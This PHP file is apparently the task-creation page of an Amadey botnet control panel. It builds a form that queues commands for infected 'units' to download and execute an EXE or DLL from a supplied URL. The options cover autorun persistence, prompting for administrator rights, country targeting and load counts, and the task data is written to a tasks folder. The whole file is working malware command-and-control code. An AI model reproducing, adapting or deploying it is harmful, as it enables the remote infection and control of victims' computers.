<?php

    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }
      
    function MakeTask( $Url, $FileType, $AutoRunType, $Type, $Needs, $id, $country ) 
    {
       $TaskId = rand( 1000000, 9999999 );
       $TaskId = $TaskId . $FileType . $AutoRunType . $Type;  
       file_put_contents( "./tasks/" . $TaskId . ".tsk", $TaskId . $Url );
       file_put_contents( "./tasks/" . $TaskId . ".i", $id );
       file_put_contents( "./tasks/" . $TaskId . ".l", "" );
       file_put_contents( "./tasks/" . $TaskId . ".n", $Needs );
       file_put_contents( "./tasks/" . $TaskId . ".d0", "0" );
       file_put_contents( "./tasks/" . $TaskId . ".d1", "0" );
       file_put_contents( "./tasks/" . $TaskId . ".e0", "0" );
       file_put_contents( "./tasks/" . $TaskId . ".e1", "0" );
       file_put_contents( "./tasks/" . $TaskId . ".ct", "." . $country );
    }

    function MakeFormAlt( $c, $u ) 
    {
       if ( $c == "" )
       {     
          $count = "100";
       }
       else
       {
          $count = $c;
       }

       if ( $u == "" )
       {     
          $unit = "*";
       }
       else
       {
          $unit = $u;
       }

       $res = 
          
       "<div align=\"center\">
           <form action=\"" . basename( $_SERVER['SCRIPT_NAME'] ) . "\" method=\"post\" name=\"form\">
              <table border=\"0\" width=\"1200\" cellspacing=\"0\" class=table cellpadding=\"0\">
	         <tr>
		    <td>  
                       <table border=\"0\" width=\"1200\" height=\"220\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
	                  <tr>
		             <td width=\"150\">&nbsp;URL:</td>
		             <td>
		                <input name=\"path\" class=task value=\"http://site.com/folder/exe.e\" style=\"float: left\" size=\"50\">
                             </td>
		             
                             <td>
                                * Web URL, file will be saved with original name, expansion will be changed.
                             </td>
	                  </tr>
	      
                          <tr>
		             <td>&nbsp;UID:</td>

		             <td>
		                <input name=\"id\" class=task value=\"" . $unit . "\" style=\"float: left\">
                             </td>

		             <td>
                                * Uniqal unit identificator or * for all units.
                             </td>
	                  </tr>

	                  <tr>
		             <td>&nbsp;Limit:</td>
		 
                             <td>
		                <input name=\"count\" class=task value=\"" . $count . "\" style=\"float: left\">
                             </td>

		             <td>
                                * This task loads count.
                             </td>
	                  </tr>

	                  <tr>
		             <td>&nbsp;Countries:</td>
		 
                             <td>
		                <input name=\"country\" class=task value=\"*\" style=\"float: left\">
                             </td>

		             <td>
                                * Chosen country, * for any. <a href=\"images/task_example.png\" target=\"_blank\">Example</a>. <a href=\"f.st\c.index.txt\" target=\"_blank\">Countries <b>index</b> table</a>.
                             </td>
	                  </tr>

                          <tr>
		             <td>&nbsp;File type:</td>

		             <td>
		                <select name=\"filetype\">
                                   <option value=\"0\">EXE file
                                   <option value=\"1\">DLL file
                                </select>
                             </td>
		
                             <td>
                                * File PE type, any expansion.
                             </td>
	                  </tr>

	                  <tr>
		             <td>&nbsp;Dll function name:</td>
		 
                             <td>
		                <input name=\"dllfunction\" class=task value=\"Main\" style=\"float: left\">
                             </td>

		             <td>
                                * Name of the calling function, <b>only for DLL</b>.
                             </td>
	                  </tr>


                          <tr>
		             <td>&nbsp;Exe autorun type:</td>

		             <td>
		                <select name=\"autorun\"> 
                                   <option value=\"1\">Self autorun
                                   <option value=\"0\">Amadey autorun
                                </select>
                             </td>
	
                             <td>
                                * Startup options, <b>only for EXE</b>.
                            </td>
	                  </tr>

                          <tr>
		             <td>&nbsp;Exe launch:</td>

		             <td>
		                <select name=\"run\"> 
                                   <option value=\"0\">Current rights (current user)
                                   <option value=\"1\">Up rights (request ADMINISTRATOR rights)
                                </select>
                             </td>
	
                             <td>
                                * Startup options, <b>only for EXE</b>. Warning! Do not change this option if you don't know what it is.
                            </td>
	                  </tr>

                       </table> 

                       <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                  <tr>
		             <td>
                             </td>
	                  </tr>
                       </table>

                       <table border=\"0\" width=\"1200\" cellspacing=\"0\" cellpadding=\"0\">
	                  <tr>
		             <td>
                                <p align=\"center\">
                                   <input type=\"submit\" name=\"submit\" value=\"Save task\" class=\"button\">
                                </p>
                             </td>
	                  </tr>
                       </table>

                       <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                  <tr>
		             <td>
                             </td>
	                  </tr>
                       </table>

		    </td>
	         </tr>
              </table>
           </form> 
        </div>";

       return $res;
    }



    include( "header.php" );

    if( isset( $_POST['submit'] ) ) 
    { 
       if ( $_POST['filetype'] == 0 )
       {
          MakeTask( $_POST['path'], $_POST['run'], $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['id'], $_POST['country'] ); 
       }
       else
       {
          MakeTask( $_POST['path']  . ":::" . $_POST['dllfunction'], "0", $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['id'], $_POST['country'] ); 
       }

       echo "<meta http-equiv=\"refresh\" content=\"1; url=show_task.php\">"; 
    }
    else
    {
       echo ( MakeFormAlt( $_GET["count"], $_GET["unit"] ) ); 
    }
   
    echo "</html>";
?> 